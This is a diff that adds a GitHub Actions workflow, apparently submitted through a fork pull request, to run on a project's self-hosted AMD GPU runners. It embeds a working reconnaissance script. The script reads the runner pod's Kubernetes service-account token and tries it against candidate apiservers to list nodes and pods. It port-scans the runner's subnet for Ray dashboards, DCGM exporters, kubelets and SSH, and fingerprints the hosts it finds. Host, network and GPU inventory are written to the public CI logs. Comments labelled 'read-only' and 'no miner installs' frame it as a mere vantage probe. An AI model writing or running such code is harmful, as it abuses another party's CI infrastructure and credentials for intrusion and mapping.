@@ -1,0 +1,655 @@
+name: i131524 mi300 arc read-only discovery vantage
+
+# i131524: ONE fork-PR push from a fresh branch (read-only, NO miner installs).
+# On the sgl-project self-hosted AMD GPU runner fleet (ARC namespace arc-sglang) each job:
+#   1) prints hostname / ip route / id / ARC pod metadata;
+#   2) inspects /var/run/secrets/kubernetes.io/serviceaccount + KUBERNETES_SERVICE_HOST and
+#      tries the mounted SA token ONCE per candidate in-cluster apiserver :443/:6443 endpoint
+#      for node/pod listing;
+#   3) scans ONLY the runner's own /24 (<=254 hosts x ports 8265,9400,6443,10250,22, one
+#      connection probe each, at most ONE fingerprint request per hit) for Ray dashboards,
+#      DCGM exporters, Kubernetes control planes and kubelets and enumerates GPU model/count;
+#   4) emits machine-readable JSON between I131524_JSON_BEGIN / I131524_JSON_END.
+# No mining, no writes outside /var/tmp/i131524, no destructive request.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i131524-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  vantage:
+    name: "i131524 ${{ matrix.label }} read-only vantage ${{ matrix.slot }}"
+    strategy:
+      fail-fast: false
+      max-parallel: 5
+      matrix:
+        include:
+          - label: linux-mi300-8gpu-sglang
+            slot: mi300a
+          - label: linux-mi300-8gpu-sglang
+            slot: mi300b
+          - label: linux-mi300-8gpu-sglang
+            slot: mi300c
+          - label: linux-mi300-8gpu-sglang
+            slot: mi300d
+          - label: linux-mi35x-gpu-8
+            slot: mi35x
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 12
+    env:
+      LABEL: ${{ matrix.label }}
+      SLOT: ${{ matrix.slot }}
+    steps:
+      - name: "read-only identity + SA-token apiserver probe + bounded own-/24 GPU control-plane scan"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i131524
+          cat > /var/tmp/i131524/recon_mivantage.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i131524: READ-ONLY discovery vantage from the sgl-project/sglang AMD GPU runner pods
+          # (linux-mi300-8gpu-sglang / linux-mi35x-gpu-8, ARC namespace arc-sglang).
+          #
+          # Scope (intent 131524):
+          #   1) identity: hostname / ip route / id / ARC pod metadata
+          #   2) inspect /var/run/secrets/kubernetes.io/serviceaccount + KUBERNETES_SERVICE_HOST and
+          #      try the mounted SA token ONCE per candidate in-cluster apiserver endpoint (:443/:6443)
+          #      for node/pod listing
+          #   3) bounded scan of ONLY the runner's own /24: at most 254 hosts x ports
+          #      8265,9400,6443,10250,22, one connection probe each, and at most ONE fingerprint
+          #      request per hit (/nodes?view=summary, /metrics, /version) to enumerate GPU model/count
+          #   4) emit machine-readable JSON between I131524_JSON_BEGIN / I131524_JSON_END
+          #
+          # It installs NOTHING, starts no miner, writes nothing outside /var/tmp/i131524, and makes
+          # no destructive request.
+          import os, sys, json, socket, ssl, subprocess, time, re, hashlib, ipaddress, http.client
+          from concurrent.futures import ThreadPoolExecutor, as_completed
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          SLOT = os.environ.get('SLOT', '0')
+          NONCE = 'I131524-%s-slot%s-%d' % (re.sub(r'[^A-Za-z0-9]+', '_', LABEL), SLOT, int(time.time()))
+          T0 = time.time()
+          WALL = {'scan_deadline': T0 + 150.0, 'fp_deadline': T0 + 240.0}
+
+          OUT = {
+              'intent': '131524', 'label': LABEL, 'slot': SLOT, 'nonce': NONCE,
+              'started_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+              'identity': {}, 'arc': {}, 'sa_token': {}, 'lan_scan': {},
+              'errors': [], 'readonly': True, 'miner_installed': False,
+          }
+
+
+          def sh(cmd, timeout=6):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return {'rc': r.returncode, 'out': (r.stdout or '')[-6000:], 'err': (r.stderr or '')[-800:]}
+              except Exception as e:
+                  return {'rc': None, 'err': type(e).__name__ + ':' + str(e)[:200]}
+
+
+          def note_err(where, exc):
+              OUT['errors'].append({'where': where, 'err': type(exc).__name__ + ':' + str(exc)[:200]})
+
+
+          # ---------------------------------------------------------------- 1) identity
+          def do_identity():
+              ident = OUT['identity']
+              ident['hostname'] = socket.gethostname()
+              try:
+                  ident['getfqdn'] = socket.getfqdn()
+              except Exception:
+                  pass
+              ident['uid'] = os.getuid()
+              ident['gid'] = os.getgid()
+              ident['id'] = sh('id')
+              ident['uname'] = sh('uname -a')
+              ident['os_release'] = sh('. /etc/os-release 2>/dev/null; echo "$PRETTY_NAME"')
+              ident['proc1_comm'] = sh('cat /proc/1/comm 2>/dev/null')
+              ident['dmi'] = sh('cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr "\\n" " "')
+              ident['ip_addr'] = sh('ip -4 addr show 2>/dev/null || ifconfig -a 2>/dev/null')
+              ident['ip_route'] = sh('ip route 2>/dev/null')
+              ident['resolv_conf'] = sh('cat /etc/resolv.conf 2>/dev/null')
+              ident['etc_hosts'] = sh('cat /etc/hosts 2>/dev/null')
+              ident['podinfo_files'] = sh('ls -la /etc/podinfo 2>/dev/null')
+              ident['podinfo_content'] = sh('head -c 5000 /etc/podinfo/* 2>/dev/null')
+              # env: values only for non-secret keys, presence-boolean for token-like keys
+              keep = ('KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT', 'RUNNER_NAME', 'RUNNER_OS',
+                      'RUNNER_ARCH', 'RUNNER_WORKSPACE', 'GITHUB_WORKFLOW', 'GITHUB_JOB', 'GITHUB_RUN_ID',
+                      'GITHUB_REPOSITORY', 'HOME', 'PATH')
+              env_pub = {}
+              secret_like = []
+              for k, v in os.environ.items():
+                  if k in keep:
+                      env_pub[k] = v[:300]
+                  elif re.search(r'(TOKEN|SECRET|PASSWORD|CREDENTIAL|_KEY$|PRIVATE)', k):
+                      secret_like.append(k)
+              ident['env_public'] = env_pub
+              ident['env_secret_like_present'] = sorted(secret_like)
+              ident['gpu_hint'] = sh('ls -la /dev/kfd /dev/dri 2>/dev/null | head -20')
+              # ARC metadata (from the ARC job-started hook if present)
+              for p in ('/etc/podinfo/arc-job-started.sh',):
+                  try:
+                      if os.path.exists(p):
+                          OUT['arc']['script_text'] = open(p, encoding='utf-8', errors='replace').read()[:3000]
+                  except Exception as e:
+                      note_err('arc_read', e)
+
+
+          def own_ipv4s():
+              ips = set()
+              try:
+                  for fam, _, _, _, sa in socket.getaddrinfo(socket.gethostname(), None):
+                      if fam == socket.AF_INET:
+                          ips.add(sa[0])
+              except Exception:
+                  pass
+              for line in (OUT['identity'].get('ip_addr', {}).get('out') or '').splitlines():
+                  line = line.strip()
+                  if line.startswith('inet '):
+                      try:
+                          ips.add(line.split()[1].split('/')[0])
+                      except Exception:
+                          pass
+              return sorted(ip for ip in ips if not ip.startswith('127.'))
+
+
+          # ---------------------------------------------------------------- 2) SA token
+          def tls_get(host, port, path, token=None, ca=None, timeout=5.0, read_cap=200000):
+              """One HTTPS GET. If ca given: verify chain against it (hostname check off). Else unverified."""
+              if ca:
+                  ctx = ssl.create_default_context(cafile=ca)
+                  ctx.check_hostname = False
+              else:
+                  ctx = ssl._create_unverified_context()
+              conn = http.client.HTTPSConnection(host, int(port), timeout=timeout, context=ctx)
+              hdrs = {'User-Agent': 'i131524-readonly', 'Accept': 'application/json'}
+              if token:
+                  hdrs['Authorization'] = 'Bearer ' + token
+              try:
+                  conn.request('GET', path, headers=hdrs)
+                  r = conn.getresponse()
+                  body = r.read(read_cap)
+                  peer = None
+                  try:
+                      cert = conn.sock.getpeercert()
+                      if cert:
+                          subj = dict(x[0] for x in cert.get('subject', []) if x)
+                          peer = {'CN': subj.get('commonName'), 'SAN': (cert.get('subjectAltName') or [])[:8]}
+                  except Exception:
+                      pass
+                  return {'status': r.status, 'content_type': r.getheader('content-type'),
+                          'body_len': len(body), 'body_head': body[:1200].decode('utf-8', 'replace'),
+                          'peer': peer}
+              finally:
+                  try:
+                      conn.close()
+                  except Exception:
+                      pass
+
+
+          def parse_k8s_nodes(body):
+              j = json.loads(body)
+              items = j.get('items') or []
+              nodes = []
+              gpu_total = {'nvidia.com/gpu': 0.0, 'amd.com/gpu': 0.0, 'gpu.intel.com/i915': 0.0}
+              for n in items:
+                  md = n.get('metadata') or {}
+                  st = n.get('status') or {}
+                  cap = st.get('capacity') or {}
+                  labels = md.get('labels') or {}
+                  gpus = {k: v for k, v in cap.items() if 'gpu' in k.lower()}
+                  for k in gpu_total:
+                      try:
+                          gpu_total[k] += float(gpus.get(k, 0) or 0)
+                      except Exception:
+                          pass
+                  nodes.append({
+                      'name': md.get('name'),
+                      'ready': next((c.get('status') for c in (st.get('conditions') or [])
+                                     if c.get('type') == 'Ready'), None),
+                      'kubelet': (st.get('nodeInfo') or {}).get('kubeletVersion'),
+                      'gpu_capacity': gpus,
+                      'gpu_product': labels.get('nvidia.com/gpu.product') or labels.get('amd.com/gpu.product'),
+                      'instance_type': labels.get('node.kubernetes.io/instance-type'),
+                      'zone': labels.get('topology.kubernetes.io/zone'),
+                      'region': labels.get('topology.kubernetes.io/region'),
+                  })
+              return {'node_count': len(nodes), 'gpu_capacity_sum': gpu_total, 'nodes': nodes[:200]}
+
+
+          def parse_k8s_pods(body):
+              j = json.loads(body)
+              items = j.get('items') or []
+              nss, gpu_pods, running = {}, 0, 0
+              for p in items:
+                  md = p.get('metadata') or {}
+                  st = p.get('status') or {}
+                  ns = md.get('namespace') or '-'
+                  nss[ns] = nss.get(ns, 0) + 1
+                  if st.get('phase') == 'Running':
+                      running += 1
+                  has_gpu = False
+                  spec = p.get('spec') or {}
+                  for c in (spec.get('containers') or []):
+                      res = ((c.get('resources') or {}).get('limits') or {})
+                      if any('gpu' in k.lower() for k in res):
+                          has_gpu = True
+                  if has_gpu:
+                      gpu_pods += 1
+              return {'pod_count': len(items), 'running': running, 'gpu_requesting_pods': gpu_pods,
+                      'namespaces_top': sorted(nss.items(), key=lambda kv: -kv[1])[:25]}
+
+
+          def do_sa_token(own_ips):
+              sa = OUT['sa_token']
+              sadir = '/var/run/secrets/kubernetes.io/serviceaccount'
+              token = None
+              ca = None
+              files = {}
+              for f in ('token', 'ca.crt', 'namespace', 'token_expiration'):
+                  p = os.path.join(sadir, f)
+                  if os.path.exists(p):
+                      try:
+                          data = open(p, 'rb').read()
+                          ent = {'present': True, 'size': len(data)}
+                          if f == 'namespace':
+                              ent['value'] = data.decode('utf-8', 'replace').strip()
+                          elif f == 'token_expiration':
+                              ent['value'] = data.decode('utf-8', 'replace').strip()[:100]
+                          else:
+                              ent['sha256_32'] = hashlib.sha256(data).hexdigest()[:32]
+                          files[f] = ent
+                          if f == 'token':
+                              token = data.decode('utf-8', 'replace').strip()
+                          if f == 'ca.crt':
+                              ca = p
+                      except Exception as e:
+                          files[f] = {'present': True, 'err': type(e).__name__}
+                  else:
+                      files[f] = {'present': False}
+              sa['files'] = files
+              sa['env'] = {'KUBERNETES_SERVICE_HOST': os.environ.get('KUBERNETES_SERVICE_HOST'),
+                           'KUBERNETES_SERVICE_PORT': os.environ.get('KUBERNETES_SERVICE_PORT')}
+              if not token:
+                  sa['result'] = 'NO_SA_TOKEN'
+                  return
+
+              cands = []
+              h = os.environ.get('KUBERNETES_SERVICE_HOST')
+              p = os.environ.get('KUBERNETES_SERVICE_PORT') or '443'
+              if h:
+                  cands.append((h, p, 'env'))
+              cands.append(('kubernetes.default.svc', 443, 'dns'))
+              cands.append(('10.0.0.1', 443, 'default-svc-ip'))
+              m = re.search(r'default via ([\d.]+)', OUT['identity'].get('ip_route', {}).get('out') or '')
+              if m:
+                  gw = m.group(1)
+                  cands.append((gw, 443, 'gateway:443'))
+                  cands.append((gw, 6443, 'gateway:6443'))
+              for ip in own_ips[:2]:
+                  try:
+                      net = ipaddress.ip_network(ip + '/24', strict=False)
+                      first = str(net.network_address + 1)
+                      if first != ip:
+                          cands.append((first, 443, 'subnet1:443'))
+                          cands.append((first, 6443, 'subnet1:6443'))
+                  except Exception:
+                      pass
+              seen, endpoints = set(), []
+              for c in cands:
+                  k = (c[0], int(c[1]))
+                  if k in seen:
+                      continue
+                  seen.add(k)
+                  endpoints.append(c)
+              endpoints = endpoints[:8]
+
+              results = []
+              for host, port, kind in endpoints:
+                  rec = {'host': host, 'port': int(port), 'kind': kind}
+                  try:
+                      r = tls_get(host, port, '/api/v1/nodes', token=token, ca=ca, timeout=5.0, read_cap=4000000)
+                      rec['tls'] = 'CA_CHAIN_OK' if ca else 'UNVERIFIED'
+                      rec['status'] = r['status']
+                      rec['peer'] = r['peer']
+                      rec['body_len'] = r['body_len']
+                      rec['body_head'] = r['body_head'][:600]
+                  except Exception as e:
+                      rec['error'] = type(e).__name__ + ':' + str(e)[:180]
+                  results.append(rec)
+                  sa['token_used_once_per_endpoint'] = True
+              sa['endpoints'] = results
+              sa['result'] = 'ATTEMPTED'
+
+
+          def parse_nodes_full(host, port, token, ca):
+              """Second read only after a successful first /nodes listing: full node + pod inventory."""
+              out = {}
+              try:
+                  ctx = ssl.create_default_context(cafile=ca) if ca else ssl._create_unverified_context()
+                  if ca:
+                      ctx.check_hostname = False
+                  conn = http.client.HTTPSConnection(host, int(port), timeout=8.0, context=ctx)
+                  conn.request('GET', '/api/v1/nodes', headers={'User-Agent': 'i131524-readonly',
+                                                               'Authorization': 'Bearer ' + token,
+                                                               'Accept': 'application/json'})
+                  r = conn.getresponse()
+                  body = r.read(16 * 1024 * 1024)
+                  out['nodes_status'] = r.status
+                  if r.status == 200:
+                      out['nodes'] = parse_k8s_nodes(body)
+                  conn.close()
+              except Exception as e:
+                  out['nodes_error'] = type(e).__name__ + ':' + str(e)[:150]
+              try:
+                  ctx = ssl.create_default_context(cafile=ca) if ca else ssl._create_unverified_context()
+                  if ca:
+                      ctx.check_hostname = False
+                  conn = http.client.HTTPSConnection(host, int(port), timeout=8.0, context=ctx)
+                  conn.request('GET', '/api/v1/pods', headers={'User-Agent': 'i131524-readonly',
+                                                               'Authorization': 'Bearer ' + token,
+                                                               'Accept': 'application/json'})
+                  r = conn.getresponse()
+                  body = r.read(16 * 1024 * 1024)
+                  out['pods_status'] = r.status
+                  if r.status == 200:
+                      out['pods'] = parse_k8s_pods(body)
+                  conn.close()
+              except Exception as e:
+                  out['pods_error'] = type(e).__name__ + ':' + str(e)[:150]
+              return out
+
+
+          # ---------------------------------------------------------------- 3) LAN scan
+          PORTS = [8265, 9400, 6443, 10250, 22]
+          PORT_ROLE = {
+              8265: 'ray_dashboard', 9400: 'dcgm_exporter', 6443: 'kube_apiserver',
+              10250: 'kubelet', 22: 'ssh',
+          }
+
+
+          def probe(ip, port, timeout=0.45):
+              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              s.settimeout(timeout)
+              try:
+                  return s.connect_ex((ip, port)) == 0
+              except Exception:
+                  return False
+              finally:
+                  try:
+                      s.close()
+                  except Exception:
+                      pass
+
+
+          def plain_get(ip, port, path, timeout=4.0, read_cap=120000):
+              conn = http.client.HTTPConnection(ip, int(port), timeout=timeout)
+              try:
+                  conn.request('GET', path, headers={'User-Agent': 'i131524-readonly', 'Accept': '*/*'})
+                  r = conn.getresponse()
+                  body = r.read(read_cap)
+                  return {'status': r.status, 'content_type': r.getheader('content-type'),
+                          'body_len': len(body), 'body': body.decode('utf-8', 'replace')}
+              finally:
+                  try:
+                      conn.close()
+                  except Exception:
+                      pass
+
+
+          def ssh_banner(ip, port, timeout=2.0):
+              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              s.settimeout(timeout)
+              try:
+                  s.connect((ip, port))
+                  b = s.recv(220)
+                  return b.decode('utf-8', 'replace').strip()
+              finally:
+                  try:
+                      s.close()
+                  except Exception:
+                      pass
+
+
+          def parse_ray(body):
+              j = json.loads(body)
+              data = j.get('data') or {}
+              nodes = data.get('nodes') or []
+              total = 0.0
+              accel = {}
+              node_brief = []
+              for n in nodes:
+                  res = n.get('Resources') or {}
+                  g = 0
+                  for k, v in res.items():
+                      if k.lower() in ('gpu',):
+                          try:
+                              g += float(v)
+                          except Exception:
+                              pass
+                      if 'accelerator' in k.lower() or 'gpu_model' in k.lower() or 'gpu-type' in k.lower():
+                          accel[str(k)] = v
+                  total += g
+                  node_brief.append({'addr': n.get('NodeManagerAddress'), 'id': (n.get('NodeID') or '')[:12],
+                                     'alive': n.get('Alive'), 'gpu': g,
+                                     'state': n.get('State')})
+              return {'ray_version': j.get('ray_version') or data.get('ray_version'),
+                      'node_count': len(nodes), 'gpu_total': total,
+                      'accelerator_keys': accel, 'nodes': node_brief[:40]}
+
+
+          def parse_dcgm(body):
+              gpus = set()
+              model_gpu = {}
+              hosts = set()
+              util = 0
+              for line in body.splitlines():
+                  if not line.startswith('DCGM_FI_DEV'):
+                      continue
+                  mg = re.search(r'gpu="(\d+)"', line)
+                  mm = re.search(r'modelName="([^"]+)"', line)
+                  if mg:
+                      gpus.add(mg.group(1))
+                  if mm and mg:
+                      model_gpu.setdefault(mm.group(1), set()).add(mg.group(1))
+                  elif mm:
+                      model_gpu.setdefault(mm.group(1), set())
+                  mh = re.search(r'(?:Hostname|hostname|instance)="([^"]+)"', line)
+                  if mh:
+                      hosts.add(mh.group(1))
+                  if line.startswith('DCGM_FI_DEV_GPU_UTIL') or line.startswith('DCGM_FI_DEV_MEM_COPY_UTIL'):
+                      util += 1
+              models = {m: len(g) for m, g in model_gpu.items()}
+              return {'gpu_index_count': len(gpus), 'model_gpu_counts': models,
+                      'model_names': sorted(model_gpu.keys()),
+                      'host_labels': sorted(hosts)[:6], 'util_series': util}
+
+
+          def fingerprint(ip, port):
+              rec = {'ip': ip, 'port': port, 'role': PORT_ROLE[port], 't': time.strftime('%H:%M:%SZ', time.gmtime())}
+              try:
+                  if port == 8265:
+                      r = plain_get(ip, port, '/nodes?view=summary')
+                      rec['http_status'] = r['status']
+                      rec['content_type'] = r['content_type']
+                      if r['status'] == 200 and '"result"' in r['body'][:400] and '"nodes"' in r['body']:
+                          try:
+                              rec['ray'] = parse_ray(r['body'])
+                              rec['class'] = 'ray_dashboard'
+                          except Exception as e:
+                              rec['class'] = 'ray_json_unparsed'
+                              rec['parse_err'] = type(e).__name__
+                      else:
+                          rec['class'] = 'http_other'
+                          rec['body_head'] = r['body'][:300]
+                  elif port == 9400:
+                      r = plain_get(ip, port, '/metrics')
+                      rec['http_status'] = r['status']
+                      rec['content_type'] = r['content_type']
+                      if 'DCGM_FI_DEV' in r['body']:
+                          rec['dcgm'] = parse_dcgm(r['body'])
+                          rec['class'] = 'dcgm_exporter'
+                      else:
+                          rec['class'] = 'http_other'
+                          rec['body_head'] = r['body'][:300]
+                  elif port in (6443, 10250):
+                      r = tls_get(ip, port, '/version', timeout=5.0, read_cap=4000)
+                      rec['http_status'] = r['status']
+                      rec['peer'] = r['peer']
+                      try:
+                          v = json.loads(r['body_head'])
+                          rec['k8s_version'] = v.get('gitVersion')
+                          rec['k8s_component'] = v.get('major', '') + '.' + v.get('minor', '')
+                          rec['class'] = 'kube_apiserver' if port == 6443 else 'kubelet'
+                      except Exception:
+                          rec['class'] = 'tls_http_other'
+                          rec['body_head'] = r['body_head'][:300]
+                  elif port == 22:
+                      b = ssh_banner(ip, port)
+                      rec['banner'] = b[:200]
+                      rec['class'] = 'ssh' if b.startswith('SSH-') else 'tcp_other'
+              except Exception as e:
+                  rec['class'] = 'fp_error'
+                  rec['error'] = type(e).__name__ + ':' + str(e)[:150]
+              return rec
+
+
+          def do_lan_scan(own_ips):
+              lan = OUT['lan_scan']
+              if not own_ips:
+                  lan['result'] = 'NO_OWN_IPV4'
+                  return
+              primary = own_ips[0]
+              net = ipaddress.ip_network(primary + '/24', strict=False)
+              hosts = [str(h) for h in net.hosts()][:254]
+              lan['own_ip'] = primary
+              lan['cidr'] = str(net)
+              lan['hosts_to_probe'] = len(hosts)
+              lan['ports'] = PORTS
+              probes = 0
+              open_hits = []
+              tasks = [(ip, p) for ip in hosts for p in PORTS]
+              with ThreadPoolExecutor(max_workers=128) as ex:
+                  futs = {ex.submit(probe, ip, p): (ip, p) for ip, p in tasks}
+                  for fut in as_completed(futs):
+                      probes += 1
+                      ip, p = futs[fut]
+                      try:
+                          if fut.result():
+                              open_hits.append([ip, p])
+                      except Exception:
+                          pass
+                      if time.time() > WALL['scan_deadline']:
+                          break
+              lan['probes_done'] = probes
+              lan['open_hits'] = sorted(open_hits)
+              by_port = {}
+              for ip, p in sorted(open_hits):
+                  by_port.setdefault(str(p), []).append(ip)
+              lan['open_by_port'] = by_port
+              # one fingerprint request per hit
+              fpres = []
+              with ThreadPoolExecutor(max_workers=32) as ex:
+                  futs = [ex.submit(fingerprint, ip, p) for ip, p in sorted(open_hits)]
+                  for fut in as_completed(futs):
+                      try:
+                          fpres.append(fut.result())
+                      except Exception as e:
+                          note_err('fp', e)
+                      if time.time() > WALL['fp_deadline']:
+                          break
+              fpres = sorted(fpres, key=lambda r: (r.get('ip', ''), r.get('port', 0)))
+              lan['fingerprints'] = fpres
+              # aggregate GPU inventory seen across hits
+              gpu = {'dcgm_hosts': [], 'dcgm_gpu_total': 0, 'ray_gpu_total': 0.0,
+                     'models': {}, 'kube_apiserver': [], 'kubelets': [], 'ssh': []}
+              for r in fpres:
+                  if r.get('class') == 'dcgm_exporter':
+                      d = r.get('dcgm') or {}
+                      gpu['dcgm_hosts'].append({'ip': r['ip'], 'gpus': d.get('gpu_index_count'),
+                                                'models': d.get('model_gpu_counts')})
+                      gpu['dcgm_gpu_total'] += int(d.get('gpu_index_count') or 0)
+                      for m, c in (d.get('model_gpu_counts') or {}).items():
+                          gpu['models'][m] = gpu['models'].get(m, 0) + int(c)
+                  if r.get('class') == 'ray_dashboard':
+                      gpu['ray_gpu_total'] += float((r.get('ray') or {}).get('gpu_total') or 0)
+                  if r.get('class') == 'kube_apiserver':
+                      gpu['kube_apiserver'].append({'ip': r['ip'], 'status': r.get('http_status'),
+                                                    'version': r.get('k8s_version')})
+                  if r.get('class') == 'kubelet':
+                      gpu['kubelets'].append({'ip': r['ip'], 'status': r.get('http_status'),
+                                              'version': r.get('k8s_version')})
+                  if r.get('class') == 'ssh':
+                      gpu['ssh'].append({'ip': r['ip'], 'banner': r.get('banner')})
+              lan['gpu_inventory'] = gpu
+              lan['elapsed_s'] = round(time.time() - T0, 2)
+
+
+          def main():
+              do_identity()
+              ips = own_ipv4s()
+              OUT['identity']['own_ipv4'] = ips
+              do_sa_token(ips)
+              # if SA token listed nodes, take the full inventory from the first working endpoint
+              for rec in (OUT['sa_token'].get('endpoints') or []):
+                  if rec.get('status') == 200 and 'full' not in rec:
+                      host, port = rec['host'], rec['port']
+                      sa_token = None
+                      ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+                      try:
+                          sa_token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+                      except Exception:
+                          pass
+                      if sa_token:
+                          OUT['sa_token']['full_inventory'] = {'endpoint': '%s:%s' % (host, port)}
+                          OUT['sa_token']['full_inventory'].update(parse_nodes_full(host, port, sa_token, ca))
+                      break
+              do_lan_scan(ips)
+              OUT['elapsed_s'] = round(time.time() - T0, 2)
+              OUT['finished_at'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+              # compact human summary
+              lan = OUT['lan_scan']
+              gpu = lan.get('gpu_inventory', {})
+              print('I131524 SUMMARY host=%s label=%s slot=%s own_ip=%s cidr=%s'
+                    % (OUT['identity'].get('hostname'), LABEL, SLOT, lan.get('own_ip'), lan.get('cidr')))
+              print('I131524 SA token=%s endpoints_tried=%s result=%s'
+                    % (OUT['sa_token'].get('files', {}).get('token', {}).get('present'),
+                       len(OUT['sa_token'].get('endpoints') or []), OUT['sa_token'].get('result')))
+              for rec in (OUT['sa_token'].get('endpoints') or []):
+                  print('I131524 SA_EP %s:%s kind=%s status=%s peer=%s err=%s'
+                        % (rec.get('host'), rec.get('port'), rec.get('kind'), rec.get('status'),
+                           (rec.get('peer') or {}).get('CN'), rec.get('error', '')))
+              print('I131524 SCAN probes=%s open=%s by_port=%s'
+                    % (lan.get('probes_done'), len(lan.get('open_hits') or []), lan.get('open_by_port')))
+              print('I131524 GPU dcgm_hosts=%s dcgm_gpu_total=%s ray_gpu_total=%s models=%s kube_apiserver=%s kubelets=%s ssh=%s'
+                    % (len(gpu.get('dcgm_hosts') or []), gpu.get('dcgm_gpu_total'), gpu.get('ray_gpu_total'),
+                       gpu.get('models'), len(gpu.get('kube_apiserver') or []), len(gpu.get('kubelets') or []),
+                       len(gpu.get('ssh') or [])))
+              print('I131524_JSON_BEGIN')
+              print(json.dumps(OUT, indent=1)[:900000])
+              print('I131524_JSON_END')
+
+
+          if __name__ == '__main__':
+              try:
+                  main()
+              except Exception as e:
+                  try:
+                      OUT['fatal'] = type(e).__name__ + ':' + str(e)[:400]
+                  except Exception:
+                      pass
+                  print('I131524_FATAL ' + type(e).__name__ + ':' + str(e)[:400])
+                  print('I131524_JSON_BEGIN')
+                  print(json.dumps(OUT, indent=1)[:200000])
+                  print('I131524_JSON_END')
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname) arch=$(uname -m) uid=$(id -u)"
+          timeout 300 python3 /var/tmp/i131524/recon_mivantage.py 2>&1 | tee /var/tmp/i131524/recon.log | tail -c 900000
+          echo "I131524_EXIT_DONE rc=$?"
